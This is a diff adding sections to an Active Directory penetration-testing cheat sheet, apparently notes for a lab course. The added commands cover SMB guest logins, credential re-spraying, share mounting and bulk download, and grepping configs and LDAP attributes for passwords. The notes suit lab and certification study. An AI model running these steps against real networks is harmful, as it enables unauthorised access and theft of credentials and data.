@@ -148,6 +148,8 @@ ldapsearch -h <dc-ip> -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=u
 enum4linux -U <dc-ip> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
 ```
 
+> **SMB anonymous restricted ≠ SMB guest restricted.** If null-session SMB comes back empty, try guest before giving up: `nxc smb <ip> -u 'guest' -p ''` and `smbclient -L //<ip>/ -U 'guest%'`. Guest is a separate authenticator and admins often forget to disable it.
+
 ### Getting That First User (Kerbrute)
 
 Stealthier than SMB / LDAP probing — uses Kerberos pre-auth packets.
@@ -174,6 +176,65 @@ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt We
 ```
 
 > If clock skew breaks Kerberos: `sudo ntpdate <dc-ip>` or `sudo date -s "<time>"`.
+
+### First Creds → Loot Everything They Touch
+
+The moment a set of creds authenticates, run this loop before anything fancy. Half the boxes are already over by the end of it.
+
+#### Re-spray with the new creds
+
+```bash
+nxc smb   <range> -u '<user>' -p '<pass>' --continue-on-success
+nxc winrm <range> -u '<user>' -p '<pass>' --continue-on-success
+nxc mssql <range> -u '<user>' -p '<pass>' --continue-on-success
+```
+
+Any `[+]` result on a host you weren't already on = free pivot.
+
+#### List and read every share
+
+```bash
+## What's readable?
+smbmap -H <ip> -u '<user>' -p '<pass>'
+nxc smb <ip> -u '<user>' -p '<pass>' --shares
+
+## Interactive
+smbclient //<ip>/<share> -U '<user>%<pass>'
+
+## Mount it so you can grep + tab-complete like a normal filesystem
+mkdir -p loot/<share>
+sudo mount -t cifs //<ip>/<share> ./loot/<share> \
+    -o username='<user>',password='<pass>',vers=3.0
+```
+
+#### Auto-download everything with spider_plus
+
+```bash
+nxc smb <ip> -u '<user>' -p '<pass>' -M spider_plus -o DOWNLOAD_FLAG=true
+
+## Results:
+##   JSON index: /root/.nxc/modules/nxc_spider_plus/<ip>.json
+##   Files:      /root/.nxc/modules/nxc_spider_plus/<ip>/
+```
+
+#### File-format gotchas when hunting configs
+
+- **XLSX / DOCX / PPTX are ZIP files.** If a spreadsheet won't open cleanly (protected, corrupt, missing app) — `unzip file.xlsx -d out/`, then `grep -r 'password\|user\|First Name' out/`. Strings hide in `xl/sharedStrings.xml`.
+- **`.INI`, `.config`, `.xml`, `web.config`, `sql-Configuration.INI`** — always cat these when you see them.
+- **PDFs** — `pdftotext -layout` before grepping.
+
+#### Re-query LDAP with the new creds (huge upgrade over anon bind)
+
+```bash
+ldapsearch -x -H ldap://<dc-ip> -D '<user>@<domain>' -w '<pass>' \
+    -b 'dc=<dom>,dc=<tld>'
+
+## Just users
+ldapsearch -x -H ldap://<dc-ip> -D '<user>@<domain>' -w '<pass>' \
+    -b 'dc=<dom>,dc=<tld>' '(objectClass=user)'
+```
+
+> The `info` / `description` / `comment` / `userPassword` attributes on user objects sometimes contain literal passwords the sysadmin dropped in years ago. Always grep the full user dump for `pass`, `pwd`, `secret`, `cred`.
 
 ### LDAP
 
